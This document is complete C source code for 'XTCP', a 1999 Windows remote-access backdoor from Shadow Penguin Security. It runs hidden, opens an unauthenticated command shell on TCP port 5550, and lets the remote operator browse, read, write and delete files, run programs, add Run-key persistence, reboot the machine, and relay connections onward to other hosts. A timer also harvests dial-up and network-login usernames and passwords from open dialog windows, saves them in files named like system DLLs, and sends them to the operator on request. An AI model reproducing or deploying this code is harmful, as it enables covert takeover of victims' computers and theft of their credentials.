/*=============================================================================
       Tiny remote shell service program for Windows - XTCP Version 2.01
                   Produced The Shadow Penguin Security
                    http://shadowpenguin.backsection.net
        Developed by UNYUN (shadowpenguin@backsection.net), 1999/10/26 
  =============================================================================
*/
#include <sys/types.h>
#include <sys/stat.h>
#include <windows.h>
#include <windowsx.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock.h>

#define     LOGFILE                 "c:\\Windows\\System\\Winmsg.dll"   /* PPPパスワードログ            */
#define     ALOGFILE                "c:\\Windows\\System\\Wintime.dll"  /* Authパスワードログ           */
#define     PPPWIN_SEARCH_INTERVAL  1000                                /* PPP, Auth Window検索Interval */
#define     TGAPP                   "接続"                              /* PPP Window名                 */
#define     AUTHAPP                 "ネットワーク パスワードの入力"     /* Auth Window名                */
#define     WNDNO_USER              5
#define     WNDNO_PASS              7
#define     WNDNO_TEL               12
#define     WNDNO_AUSER             2
#define     WNDNO_APASS             4
#define     CLASS_NAME              "Sysmon32"

#define     CMD_PASSWD          "passwd"
#define     CMD_LOGOUT          "logout"
#define     CMD_XTELNET         "xtelnet"
#define     CMD_LS              "ls"
#define     CMD_CAT             "cat"
#define     CMD_RM              "rm"
#define     CMD_CP              "cp"
#define     CMD_REN             "ren"
#define     CMD_MKTEXT          "mktext"
#define     CMD_REGRUN          "regrun"
#define     CMD_EXEC            "exec"
#define     CMD_HALT            "shutdown"
#define     CMD_REBOOT          "reboot"
#define     CMD_POPUP           "popup"
#define     CMD_UUENCODE        "uuencode"
#define     CMD_UUDECODE        "uudecode"

#define     PROMPT              "[ush]#"
#define     MIN_WSOCKVER        1
#define     WM_ASYNC_SELECT     WM_USER+1
#define     MAXBUF              10000
#define     MAXCMDLEN           1000
#define     CON1_PORT           5550
#define     MAX_IPADDR          30
#define     MAXEOFS             10

extern      LRESULT WINAPI TestWndProc(HWND, UINT, WPARAM, LPARAM);

SOCKET      sock_listen;
SOCKET      sock0,sock1;
int         sock_use[2];
UINT        dtimer;
UINT        ppp_pcount=0;
UINT        auth_pcount=0;

int XMessageBox(HWND hwnd,char *l1,char *l2,UINT flag)
{
    UINT z=0;
    //z=MessageBox(hwnd,l1,l2,flag);
    return(z);
}
int PASCAL WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, LPSTR pszCmdLine, int CmdShow)
{
    MSG         msg;
    WNDCLASS    wc;
    HWND        hWnd;

    if (!hInstPrev){
        wc.style        =0;
        wc.lpfnWndProc  =TestWndProc;
        wc.cbClsExtra   =0;
        wc.cbWndExtra   =0;
        wc.hInstance    =hInst;
        wc.hIcon        =LoadIcon(hInst,"Icon");
        wc.hCursor      =LoadCursor(NULL,IDC_ARROW);
        wc.hbrBackground=(HBRUSH)(COLOR_WINDOW+1);
        wc.lpszClassName=CLASS_NAME;

        if (!RegisterClass(&wc))
            return FALSE;
        hWnd=CreateWindow(CLASS_NAME,CLASS_NAME,WS_OVERLAPPEDWINDOW,
                          35,35,350,250,NULL,NULL,hInst,NULL);
    }
    if (hWnd!=NULL){
        //ShowWindow(hWnd,CmdShow);
        UpdateWindow(hWnd);
        while(GetMessage(&msg,NULL,0,0)){
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }
    return(msg.wParam);
}
void    SocketOperation(HWND hwnd,WPARAM wParam,LPARAM lParam)
{
    long        lEvent=WSAGETSELECTEVENT(lParam);
    SOCKET      s=(SOCKET)wParam;
    INT         DestroySocket(SOCKET);
    BOOL        SendCommand(SOCKET,LPSTR,int);
    BOOL        ConnectToServer(HWND,LPSTR,int);
    BOOL        BootProcess(HWND,char *,char *);
    int         uudecode(char *,char *);
    int         uuencode(char *,char *,char *);
    UINT        r,i,j;
    UINT        tgport;
    static int  fmktext=0;
    static char buf[MAXBUF];
    static char scmd[MAXCMDLEN];
    static FILE *pmktext;
    char        tgipaddr[MAX_IPADDR];


    if (lEvent==FD_ACCEPT){
        SOCKADDR_IN clientAddr;
        int         nClientAddrLen=sizeof(clientAddr);
        SOCKET      s;

        s=accept(sock_listen,(LPSOCKADDR)&clientAddr,&nClientAddrLen);
        if (s==INVALID_SOCKET){
            if (WSAGetLastError()!=WSAEWOULDBLOCK) return;
        }
        if (sock_use[0]==0 && sock_use[1]==0){
            sock0=s;
            strcpy(scmd,"");
            sprintf(buf,"XTCP Ver2.01 Produced by Shadow Penguin Security\n\r%s",PROMPT);
            send(sock0,buf,strlen(buf),0);
        }else{
            DestroySocket(s);
            return;
        }
    }else if (lEvent==FD_CONNECT){
        sprintf(buf,"Connected.\n\r");
        send(sock0,buf,strlen(buf),0);
        sock_use[1]=1;
        strcpy(scmd,"");
        return;
    }else if (lEvent==FD_CLOSE){
        DestroySocket(sock1);
        DestroySocket(sock0);
        sock_use[0]=0;
        sock_use[1]=0;
        strcpy(tgipaddr,"");
        tgport=0;
        return;
    }
    if ((r=recv(s,(LPSTR)&buf,MAXBUF,0))==SOCKET_ERROR) return;
    if (s==sock0){
        // クライアントからのパケット
        if (sock_use[1]==1)
            send(sock1,buf,r,0); // 踏み台モードでは、ターゲットにパケットを直送
        else if (buf[r-1]==4 || buf[r-2]==13){ // クライアントからのコマンド受付
            if (buf[r-1]==4) buf[r]=0;
            else if (buf[r-2]==13) buf[r-2]=0;
            
            strcat(scmd,buf);   // scmd:クライアントからのコマンド
            // コマンド処理
            for (;;){
                for (i=0;i<(int)strlen(scmd);i++)
                    if (scmd[i]==8) break;
                if (i==(int)strlen(scmd)) break;
                for (j=i+1;j<(int)strlen(scmd);j++)
                    scmd[j-2]=scmd[j];
                scmd[j-2]=0;
            }
            if (fmktext){
                for (i=0;i<(int)strlen(scmd);i++)
                    if (scmd[i]==4){
                        fclose(pmktext);
                        fmktext=0;
                        send(sock0,PROMPT,strlen(PROMPT),0);
                        strcpy(scmd,"");
                        return;
                    }
                strcat(buf,"\n\r");
                send(sock0,buf,strlen(buf),0); 
                fprintf(pmktext,"%s\n\r",scmd);
                strcpy(scmd,"");
                return;
            }
            if (buf[r-1]==4) buf[r-1]=0;
            strcat(buf,"\n\r");
            send(sock0,buf,strlen(buf),0); // \n\r付きをechoとして返す

            // Logout
            if (!strcmp(scmd,CMD_LOGOUT)){
                DestroySocket(sock0);
                strcpy(scmd,"");
                return;
            }

            if (!strcmp(scmd,CMD_REBOOT))
                ExitWindowsEx(EWX_REBOOT,0);
            if (!strcmp(scmd,CMD_HALT))
                ExitWindowsEx(EWX_SHUTDOWN,0); 

            // popup
            if (!strncmp(scmd,CMD_POPUP,strlen(CMD_POPUP))){
                if (strlen(scmd)<strlen(CMD_POPUP)+2){
                    sprintf(buf,"usage : %s Message\n\r%s",CMD_POPUP,PROMPT);
                    send(sock0,buf,strlen(buf),0);
                    strcpy(scmd,"");
                    return;
                }
                MessageBox(NULL,scmd+strlen(CMD_POPUP)+1,"",MB_OK);
                send(sock0,PROMPT,strlen(PROMPT),0);
                strcpy(scmd,"");
                return;
            }

            // Make Text
            if (!strncmp(scmd,CMD_MKTEXT,strlen(CMD_MKTEXT))){
                if (strlen(scmd)<strlen(CMD_MKTEXT)+2){
                    sprintf(buf,"usage : %s File\n\r%s",CMD_MKTEXT,PROMPT);
                    send(sock0,buf,strlen(buf),0);
                    strcpy(scmd,"");
                    return;
                }
                if ((pmktext=fopen(scmd+strlen(CMD_MKTEXT)+1,"wb"))==NULL){
                    sprintf(buf,"Can not write.\r%s",PROMPT);
                    send(sock0,buf,strlen(buf),0);
                    strcpy(scmd,"");
                    return;
                }
                fmktext=1;
                strcpy(scmd,"");
                return;
            }

            // regrun
            if (!strncmp(scmd,CMD_REGRUN,strlen(CMD_REGRUN))){
                char    p1[256],p2[256];
                UINT    cs,err=0;
                char    szKey[256];
                HKEY    hKey=0;
                DWORD   disp=0,d1,d2;

                if (strlen(scmd)<strlen(CMD_REGRUN)+3){
                    sprintf(buf,"usage : %s [-l][-c][-d]\n\r%s",CMD_REGRUN,PROMPT);
                    send(sock0,buf,strlen(buf),0);
                    strcpy(scmd,"");
                    return;
                }
                strcpy(szKey,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
                if (RegCreateKeyEx(HKEY_LOCAL_MACHINE,szKey,0,NULL,REG_OPTION_VOLATILE,
                        KEY_ALL_ACCESS,NULL,&hKey,&disp)!=ERROR_SUCCESS){
                    sprintf(buf,"Can not open registry.\n\r%s",PROMPT);
                    send(sock0,buf,strlen(buf),0);
                    strcpy(scmd,"");
                    return;
                }

                cs=strlen(CMD_REGRUN)+4;
                switch (scmd[strlen(CMD_REGRUN)+2]){
                  case 'c': if (strlen(scmd)<=cs){ err=1; break;}
                            for (i=cs;i<(int)strlen(scmd);i++)
                                if (scmd[i]==' ') break;
                            if (i==cs || i==strlen(scmd)){ err=1; break;}
                            scmd[i]=0;
                            if (RegSetValueEx(hKey,scmd+cs,0,REG_SZ,scmd+i+1,strlen(scmd+i+1))!=ERROR_SUCCESS)
                                err=2;
                            break;
                  case 'd': if (strlen(scmd)<=cs){ err=1; break;}
                            if (RegDeleteValue(hKey,scmd+cs)!=ERROR_SUCCESS)
                                err=2;
                            break;
                  case 'l': for (i=0;;i++){
                                d1=d2=256;
                                if (RegEnumValue(hKey,i,p1,&d1,NULL,NULL,p2,&d2)!=ERROR_SUCCESS) break;
                                sprintf(buf,"%-20s %s\n\r",p1,p2);
                                send(sock0,buf,strlen(buf),0);
                            }
                            break;
                  default:  err=1;
                            break;
                }
                RegCloseKey(hKey);
                if (err==1) sprintf(buf,"Invalid arguments.\n\r%s",PROMPT);
                else if (err==2) sprintf(buf,"Registry I/O error.\n\r%s",PROMPT);
                else strcpy(buf,PROMPT);
                send(sock0,buf,strlen(buf),0);
                strcpy(scmd,"");
                return;
            }

            // exec
            if (!strncmp(scmd,CMD_EXEC,strlen(CMD_EXEC))){
                BOOL r=TRUE;
                char p1[100],p2[100];

                if (strlen(scmd)<=strlen(CMD_EXEC)+2){
                    sprintf(buf,"usage : %s execfile arg1 arg2 ...\n\r%s",PROMPT);
                    send(sock0,buf,strlen(buf),0);
                    strcpy(scmd,"");
                    return;
                }
                for (i=strlen(CMD_EXEC)+1;i<strlen(scmd);i++)
                    if (scmd[i]==' ') break;
                if (i==strlen(scmd)){
                    strcpy(p1,scmd+strlen(CMD_EXEC)+1); strcpy(p2,"");
                    r=BootProcess(hwnd,p1,p2);
                }else{
                    scmd[i]=0;
                    strcpy(p1,scmd+strlen(CMD_EXEC)+1); strcpy(p2,scmd+i+1);
                    r=BootProcess(hwnd,p1,p2);
                }
                if (r==FALSE) sprintf(buf,"Execution error.\n\r%s,%s\n\r%s",p1,p2,PROMPT);
                else strcpy(buf,PROMPT);
                send(sock0,buf,strlen(buf),0);
                strcpy(scmd,"");
                return;
            }
            
            // uuencode
            if (!strncmp(scmd,CMD_UUENCODE,strlen(CMD_UUENCODE))){
                char f1[MAX_PATH],f2[MAX_PATH];
                int  r=0;
                sscanf(scmd,"%s %s %s",CMD_UUENCODE,f1,f2);
                if (!strlen(f1) || !strlen(f2)){
                    sprintf(buf,"usage : %s EncodeFile Outputfile.\n\r%s",CMD_UUENCODE,PROMPT);
                }else{
                    strcpy(buf,PROMPT);
                    for (r=strlen(f1)-1;r>=0;r--)
                        if (f1[r]=='\\') break;
                    r=uuencode(f1,f2,f1+r+1);
                }
                if (r!=0) sprintf(buf,"Encode error.\n\r%s",PROMPT);
                send(sock0,buf,strlen(buf),0);
                strcpy(scmd,"");
                return;
            }
            // uudecode
            if (!strncmp(scmd,CMD_UUDECODE,strlen(CMD_UUDECODE))){
                char f1[MAX_PATH],f2[MAX_PATH];
                int  r=0;
                sscanf(scmd,"%s %s %s",CMD_UUDECODE,f1,f2);
                if (!strlen(f1)){
                    sprintf(buf,"usage : %s EncodedFile [Outputfile].\n\r%s",CMD_UUDECODE,PROMPT);
                }else{
                    strcpy(buf,PROMPT);
                    r=uudecode(f1,f2);
                }
                if (r!=0) sprintf(buf,"Decode error.\n\r%s",PROMPT);
                send(sock0,buf,strlen(buf),0);
                strcpy(scmd,"");
                return;
            }
            // PPP,Auth Password
            if (!strncmp(scmd,CMD_PASSWD,strlen(CMD_PASSWD))){
                FILE    *fp;
                char    pass[200];

                if (strlen(scmd)==strlen(CMD_PASSWD)+3){
                    strcpy(buf,PROMPT);
                    switch(scmd[strlen(CMD_PASSWD)+2]){
                        case 's':   dtimer=SetTimer(hwnd,1,PPPWIN_SEARCH_INTERVAL,NULL);
                                    break;
                        case 't':   KillTimer(hwnd,dtimer);
                                    break;
                        case 'd':   remove(ALOGFILE);
                                    remove(LOGFILE);
                                    break;
                        default:    sprintf(buf,"usage : %s [-s:logging start][-t:logging stop][-d:delete log]\n\r%s",CMD_PASSWD,PROMPT);
                                    break;
                    }
                    send(sock0,buf,strlen(buf),0);
                    strcpy(scmd,"");
                    return;
                }
                if (strlen(scmd)!=strlen(CMD_PASSWD)){
                    sprintf(buf,"Invalid arguments.\n\r%s",PROMPT);
                    send(sock0,buf,strlen(buf),0);
                    strcpy(scmd,"");
                    return;
                }
                if ((fp=fopen(LOGFILE,"r"))!=NULL){
                    fscanf(fp,"%s",pass);
                    strcat(pass,"\n\r");
                    sprintf(buf,"PPP:%s",pass);
                    send(sock0,buf,strlen(buf),0);
                    fclose(fp);
                }else{
                    sprintf(pass,"PPP-logfile not found.\n\r");
                    send(sock0,pass,strlen(pass),0);
                }
                if ((fp=fopen(ALOGFILE,"r"))!=NULL){
                    fscanf(fp,"%s",pass);
                    strcat(pass,"\n\r");
                    sprintf(buf,"AUTH:%s",pass);
                    send(sock0,buf,strlen(buf),0);
                    fclose(fp);
                }else{
                    sprintf(pass,"AUTH-logfile not found.\n\r");
                    send(sock0,pass,strlen(pass),0);
                }
                sprintf(buf,"%s",PROMPT);
                send(sock0,buf,strlen(buf),0);
                strcpy(scmd,"");
                return;
            }

            // 踏み台telnet
            if (!strncmp(scmd,CMD_XTELNET,strlen(CMD_XTELNET))){

                if (strlen(CMD_XTELNET)==strlen(scmd)){
                    sprintf(buf,"usage : %s IPaddress Portnumber\n\r%s",CMD_XTELNET,PROMPT);
                    send(sock0,buf,strlen(buf),0);
                    strcpy(scmd,"");
                    return;
                }
                strcpy(tgipaddr,"");
                tgport=0;
                sscanf(scmd,"%s %s %d",CMD_XTELNET,tgipaddr,&tgport);
                if (strlen(tgipaddr)==0 || tgport==0){
                    sprintf(buf,"Invalid arguments\n\r%s",PROMPT);
                    send(sock0,buf,strlen(buf),0);
                    strcpy(scmd,"");
                    return;
                }
                sprintf(buf,"Connecting to %s (%d)\n\r",tgipaddr,tgport);
                send(sock0,buf,strlen(buf),0);
                ConnectToServer(hwnd,tgipaddr,tgport);
                strcpy(scmd,"");
                return;
            }

            // cat
            if (!strncmp(scmd,CMD_CAT,strlen(CMD_CAT))){
                char    cat[MAX_PATH];
                FILE    *fp;

                if (strlen(scmd)<strlen(CMD_CAT)+2){
                    sprintf(buf,"usage : %s File\n\r%s",CMD_CAT,PROMPT);
                    send(sock0,buf,strlen(buf),0);
                    strcpy(scmd,"");
                    return;
                }else  strcpy(cat,scmd+4);
                if ((fp=fopen(cat,"rb"))==NULL){
                    sprintf(buf,"File not found\n\r%s",PROMPT);
                    send(sock0,buf,strlen(buf),0);
                    strcpy(scmd,"");
                    return;
                }
                for (;;){
                    if (feof(fp)) break;
                    buf[0]=getc(fp); buf[1]=0;
                    send(sock0,buf,2,0);
                }
                fclose(fp);
                send(sock0,PROMPT,strlen(PROMPT),0);
                strcpy(scmd,"");
                return;
            }

            // rm
            if (!strncmp(scmd,CMD_RM,strlen(CMD_RM))){
                if (strlen(scmd)<strlen(CMD_RM)+2)
                    sprintf(buf,"usage : %s File\n\r%s",CMD_RM,PROMPT);
                else if (remove(scmd+3)==-1)
                    sprintf(buf,"Can not remove.\n\r%s",PROMPT);
                else strcpy(buf,PROMPT);
                send(sock0,buf,strlen(buf),0);
                strcpy(scmd,"");
                return;
            }
            // cp
            if (!strncmp(scmd,CMD_CP,strlen(CMD_CP))){
                UINT i;
                char s[MAX_PATH],d[MAX_PATH];
                FILE *fpi,*fpo;

                strcpy(s,""); strcpy(d,"");
                sscanf(scmd,"%s %s %s",CMD_CP,s,d);
                if (!strlen(s) || !strlen(d)){
                    sprintf(buf,"usage : %s SourceFile DistFile\n\r%s",CMD_CP,PROMPT);
                    send(sock0,buf,strlen(buf),0);
                    strcpy(scmd,"");
                    return;
                }
                if ((fpi=fopen(s,"rb"))==NULL)
                    sprintf(buf,"File not found.\n\r%s",PROMPT);
                else if ((fpo=fopen(d,"wb"))==NULL){
                    fclose(fpi);
                    sprintf(buf,"Can not write.\n\r%s",PROMPT);
                }else{
                    for (;;){
                        if ((i=fread(buf,1,MAXBUF,fpi))<=0) break;
                        fwrite(buf,1,i,fpo);
                    }
                    fclose(fpi);
                    fclose(fpo);
                    strcpy(buf,PROMPT);
                }
                send(sock0,buf,strlen(buf),0);
                strcpy(scmd,"");
                return;
            }
            // ren
            if (!strncmp(scmd,CMD_REN,strlen(CMD_REN))){
                char s[MAX_PATH],d[MAX_PATH];

                strcpy(s,""); strcpy(d,"");
                sscanf(scmd,"%s %s %s",CMD_REN,s,d);
                if (!strlen(s) || !strlen(d)){
                    sprintf(buf,"usage : %s namefrom maneto\n\r%s",CMD_REN,PROMPT);
                    send(sock0,buf,strlen(buf),0);
                    strcpy(scmd,"");
                    return;
                }
                if (rename(s,d)==0) strcpy(buf,PROMPT);
                else sprintf(buf,"Can not rename.\n\r%s",PROMPT);
                send(sock0,buf,strlen(buf),0);
                strcpy(scmd,"");
                return;
            }
            // ls
            if (!strncmp(scmd,CMD_LS,strlen(CMD_LS))){
                char            lsdir[MAX_PATH];
                WIN32_FIND_DATA t;
                HANDLE          h;
                char            a[10],dt[50];
                int             i;
                SYSTEMTIME      st;

                if (strlen(scmd)<strlen(CMD_LS)+2){
                    sprintf(buf,"usage : %s Drive:Directory\n\r%s",CMD_LS,PROMPT);
                    send(sock0,buf,strlen(buf),0);
                    strcpy(scmd,"");
                    return;
                }else  strcpy(lsdir,scmd+3);

                if ((h=FindFirstFile(lsdir,&t))!=INVALID_HANDLE_VALUE){
                    for (;;){
                        if (!(t.dwFileAttributes&FILE_ATTRIBUTE_ARCHIVE))
                             a[0]='-';
                        else a[0]='a';
                        if (!(t.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY))
                             a[1]='-';
                        else a[1]='d';
                        if (!(t.dwFileAttributes&FILE_ATTRIBUTE_HIDDEN))
                             a[2]='-';
                        else a[2]='h';
                        if (!(t.dwFileAttributes&FILE_ATTRIBUTE_READONLY))
                             a[3]='-';
                        else a[3]='r';
                        if (!(t.dwFileAttributes&FILE_ATTRIBUTE_SYSTEM))
                             a[4]='-';
                        else a[4]='s';
                        a[5]=0;
                        FileTimeToSystemTime(&t.ftLastWriteTime,&st);
                        sprintf(dt,"%4d/%2d/%2d_%2d:%2d",st.wYear,st.wMonth,st.wDay,st.wHour,st.wMinute);
                        for (i=0;i<(int)strlen(dt);i++) if (dt[i]==' ') dt[i]='0';
                        dt[10]=' ';
                        sprintf(buf,"%s %-20s %10lu %s\n\r",a,t.cFileName,t.nFileSizeLow,dt);
                        send(sock0,buf,strlen(buf),0);
                        if (FindNextFile(h,&t)==FALSE) break;
                    }
                }else{
                    sprintf(buf,"Can not find such directory.\n\r%s",PROMPT);
                    send(sock0,buf,strlen(buf),0);
                    strcpy(scmd,"");
                    return;
                }
                strcpy(buf,PROMPT);
                send(sock0,buf,strlen(buf),0);
                strcpy(scmd,"");
                return;
            }

            if (strlen(scmd)) sprintf(buf,"Command not found.\n\r%s",PROMPT);
            else strcpy(buf,PROMPT);
            send(sock0,buf,strlen(buf),0);
            strcpy(scmd,"");
        }else{
            buf[r]=0;
            send(sock0,buf,strlen(buf),0);
            strcat(scmd,buf);
        }
    }else
        // 踏み台経由ターゲットからのパケット
        send(sock0,buf,r,0); // クライアントにそのまま直送
}
BOOL CALLBACK PPPpassGetProc(HWND hwnd,LPARAM lParam)
{
    char    wb[2000],buf[100];
    char    msg[20];
    int     i;
    FILE    *fp;
    
    if (ppp_pcount==0) strcpy(wb,"");
    if (ppp_pcount==WNDNO_USER) strcpy(msg,"User=\"");
    else if (ppp_pcount==WNDNO_PASS) strcpy(msg,"Pass=\"");
    else if (ppp_pcount==WNDNO_TEL) strcpy(msg,"Tel=\"");
    else{
        ppp_pcount++;
        return TRUE;
    }
    SendMessage(hwnd,WM_GETTEXT,100,(LPARAM)buf);
    strcat(wb,msg);
    strcat(wb,buf);
    strcat(wb,"\",");
    if (ppp_pcount==12){
        if ((fp=fopen(LOGFILE,"w"))!=NULL){
            for (i=0;i<(int)strlen(wb);i++)
                if (wb[i]==' ') wb[i]='_';
            wb[strlen(wb)-1]=0;
            fprintf(fp,"%s\n",wb);
            fclose(fp);
        }
    }
    ppp_pcount++;
    return TRUE;
}
BOOL CALLBACK AuthpassGetProc(HWND hwnd,LPARAM lParam)
{
    char    wb[2000],buf[100];
    char    msg[20];
    int     i;
    FILE    *fp;
    
    if (auth_pcount==0) strcpy(wb,"");
    if (auth_pcount==WNDNO_AUSER) strcpy(msg,"User=\"");
    else if (auth_pcount==WNDNO_APASS) strcpy(msg,"Pass=\"");
    else{
        auth_pcount++;
        return TRUE;
    }
    SendMessage(hwnd,WM_GETTEXT,100,(LPARAM)buf);
    strcat(wb,msg);
    strcat(wb,buf);
    strcat(wb,"\",");
    if (auth_pcount==WNDNO_APASS){
        if ((fp=fopen(ALOGFILE,"w"))!=NULL){
            for (i=0;i<(int)strlen(wb);i++)
                if (wb[i]==' ') wb[i]='_';
            wb[strlen(wb)-1]=0;
            fprintf(fp,"%s\n",wb);
            fclose(fp);
        }
    }
    auth_pcount++;
    return TRUE;
}
LRESULT WINAPI TestWndProc(HWND hWnd, UINT iMsg, WPARAM wParam, LPARAM lParam)
{
    int             initsocket(HWND);
    void            SocketOperation(HWND,WPARAM,LPARAM);
    HWND            dhwnd;

    switch(iMsg){
        case WM_ASYNC_SELECT:
            SocketOperation(hWnd,wParam,lParam);
            break;
        case WM_TIMER:
            if (wParam==1){
                if ((dhwnd=FindWindow(NULL,TGAPP))!=NULL){
                    ppp_pcount=0;
                    EnumChildWindows(dhwnd,(WNDENUMPROC)PPPpassGetProc,0);
                }
                if ((dhwnd=FindWindowEx(NULL,NULL,NULL,AUTHAPP))!=NULL){
                    auth_pcount=0;
                    EnumChildWindows(dhwnd,(WNDENUMPROC)AuthpassGetProc,0);
                }
            }
            break;
        case WM_CREATE:
            sock_use[0]=0;
            sock_use[1]=0;
            initsocket(hWnd);
            dtimer=SetTimer(hWnd,1,PPPWIN_SEARCH_INTERVAL,NULL);
            break;
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
        default:
            return(DefWindowProc(hWnd,iMsg,wParam,lParam));
    }
    return 0L;
}
int     initsocket(HWND hwnd)
{
    SOCKADDR_IN         sAddr;
    INT                 DestroySocket(SOCKET);
    WSADATA             wsa;    
    WORD wVersionRequested;

    wVersionRequested = MAKEWORD( 2, 0 );
    if (WSAStartup(wVersionRequested , &wsa)!=0){
        XMessageBox(hwnd,"WinsockDLL Initialization error","Winsock Error",MB_OK);
        return -1;
    }
    if (wsa.wVersion<MIN_WSOCKVER){
        XMessageBox(hwnd,"Winsock version incorrect","Winsock Error",MB_OK);
        return -1;
    }

    if ((sock_listen=socket(AF_INET,SOCK_STREAM,0))==INVALID_SOCKET){
        XMessageBox(hwnd,"Can not make tcp socket","Winsock Error",MB_OK);
        return -1;
    }
    sAddr.sin_family        = AF_INET;
    sAddr.sin_addr.s_addr   = htonl(INADDR_ANY);
    sAddr.sin_port          = htons((u_short)(CON1_PORT));
    if (bind(sock_listen,(SOCKADDR *)&sAddr,sizeof(sAddr))==SOCKET_ERROR){
        XMessageBox(hwnd,"Port is already used","Winsock Error",MB_OK);
        DestroySocket(sock_listen);
        return -1;
    }
    if (listen(sock_listen,1)==SOCKET_ERROR){
        DestroySocket(sock_listen);
        XMessageBox(hwnd,"Port listening error","Winsock Error",MB_OK);
        return -1;
    }
    if (WSAAsyncSelect(sock_listen,hwnd,WM_ASYNC_SELECT,FD_ACCEPT|FD_CLOSE|FD_READ|FD_WRITE)==SOCKET_ERROR){
        DestroySocket(sock_listen);
        XMessageBox(hwnd,"AsyncSelect error","Winsock Error",MB_OK);
        return -1;
    }

    return 1;
}

INT DestroySocket(SOCKET s)
{
    INT         res;
    LINGER      ling;

    ling.l_onoff  = 1;
    ling.l_linger = 0;
    setsockopt(s,SOL_SOCKET,SO_LINGER,(LPSTR)&ling,sizeof(LINGER));
    res=closesocket(s);
    return(res);
}
BOOL    ConnectToServer(HWND hwnd,LPSTR IPaddress,int port)
{
    SOCKADDR_IN addr;
    int         serror=0;
    
    if ((sock1=socket(AF_INET,SOCK_STREAM,0))==INVALID_SOCKET){
        XMessageBox(hwnd,"Can not make tcp socket","Winsock Error",MB_OK);
        return -1;
    }

    addr.sin_family     = AF_INET;
    addr.sin_port       = htons((u_short)port);
    addr.sin_addr.s_addr= inet_addr(IPaddress); 

    if (WSAAsyncSelect(sock1,hwnd,WM_ASYNC_SELECT,FD_CONNECT|FD_CLOSE|FD_READ|FD_WRITE)==SOCKET_ERROR){
        XMessageBox(hwnd,"AsyncSelect Error","Winsock Error",MB_OK);
        return FALSE;
    }
    if (connect(sock1,(LPSOCKADDR)&addr,sizeof(addr))==SOCKET_ERROR){
        serror=WSAGetLastError();
        if (serror==WSAEWOULDBLOCK){
            return TRUE;
        }else{
            XMessageBox(hwnd,"Make connection error","Winsock Error",MB_OK);
            return FALSE;
        }
    }else return TRUE;
}
BOOL    BootProcess(HWND hDlg,char *proc,char *args)
{
    STARTUPINFO         si;
    PROCESS_INFORMATION pi;
    char                buf[MAX_PATH];
    int                 i;

    ZeroMemory(&si,sizeof(STARTUPINFO));
    ZeroMemory(&pi,sizeof(PROCESS_INFORMATION));
    si.cb=sizeof(STARTUPINFO);
    si.dwFlags=STARTF_USESHOWWINDOW;
    si.wShowWindow=SW_SHOWNORMAL;
    for (i=strlen(proc)-1;i>=0;i--) if (proc[i]=='\\') break;
    sprintf(buf,"%s %s",proc+i+1,args);
    if (CreateProcess(proc,buf,NULL,NULL,FALSE,
            0,NULL,NULL,&si,&pi)==FALSE){
        XMessageBox(hDlg,"Can not boot specified process","Boot error",MB_OK);
        return(FALSE);
    }
    strcpy(args,buf);
    return (TRUE);
}

#define ENC(c) ((c) ? ((c) & 077) + ' ': '`')
#define DEC(c)  (((c) - ' ') & 077)

int uuencode(char *infile,char *outfile,char *extname)
{
    int     ch, n;
    char    *p;
    char    buf[80];
    FILE    *fpi,*fpo;

    if ((fpi=fopen(infile,"rb"))==NULL) return -1;
    if ((fpo=fopen(outfile,"wb"))==NULL){
        fclose(fpi);
        return(-2);
    }
    fputs("begin 644 ",fpo);
    fputs(extname,fpo);
    fputc(13,fpo);
    fputc(10,fpo);  
    while (n = fread(buf,1,45,fpi)) {
        ch = ENC(n);
        if (fputc(ch,fpo) == EOF)
            break;
        for (p = buf; n > 0; n -= 3, p += 3) {
            ch = *p >> 2;
            ch = ENC(ch);
            if (fputc(ch,fpo) == EOF)
                break;
            ch = (*p << 4) & 060 | (p[1] >> 4) & 017;
            ch = ENC(ch);
            if (fputc(ch,fpo) == EOF)
                break;
            ch = (p[1] << 2) & 074 | (p[2] >> 6) & 03;
            ch = ENC(ch);
            if (fputc(ch,fpo) == EOF)
                break;
            ch = p[2] & 077;
            ch = ENC(ch);
            if (fputc(ch,fpo) == EOF)
                break;
        }
        if (fputc(13,fpo) == EOF || fputc(10,fpo)==EOF)
            break;
    }
    ch = ENC('\0');
    fputc(ch,fpo);
    fputc(13,fpo);
    fputc(10,fpo);
    fputs("end",fpo);
    fputc(13,fpo);
    fputc(10,fpo);
    fclose(fpi);
    fclose(fpo);
    return (0);
}
int uudecode(char *infile,char *outfile)
{
    int     n;
    char    ch, *p;
    int     mode;
    char    buf[MAX_PATH];
    FILE    *fpi,*fpo;
    
    if ((fpi=fopen(infile,"rb"))==NULL) return (-1);

    do {
        if (!fgets(buf, sizeof(buf), fpi)){
            fclose(fpi);
            return(-3);
        }
    } while (strncmp(buf, "begin ", 6));
    sscanf(buf, "begin %o %s", &mode, buf);

    if (buf[0] == '~'){
        fclose(fpi);
        return(-4);
    }
    if (strlen(outfile)!=0) strcpy(buf,outfile);
    if ((fpo=fopen(buf, "wb"))==NULL){
        fclose(fpi);
        return(-2);
    }

    for (;;) {
        if (!fgets(p = buf, sizeof(buf), fpi)){
            fclose(fpi); fclose(fpo);
            return(-7);
        }
        if ((n = DEC(*p)) <= 0)
            break;
        for (++p; n > 0; p += 4, n -= 3)
            if (n >= 3) {
                ch = DEC(p[0]) << 2 | DEC(p[1]) >> 4;
                fputc(ch,fpo);
                ch = DEC(p[1]) << 4 | DEC(p[2]) >> 2;
                fputc(ch,fpo);
                ch = DEC(p[2]) << 6 | DEC(p[3]);
                fputc(ch,fpo);
            }
            else {
                if (n >= 1) {
                    ch = DEC(p[0]) << 2 | DEC(p[1]) >> 4;
                    fputc(ch,fpo);
                }
                if (n >= 2) {
                    ch = DEC(p[1]) << 4 | DEC(p[2]) >> 2;
                    fputc(ch,fpo);
                }
                if (n >= 3) {
                    ch = DEC(p[2]) << 6 | DEC(p[3]);
                    fputc(ch,fpo);
                }
            }
    }
    fclose(fpi);
    fclose(fpo);
    return(0);
}
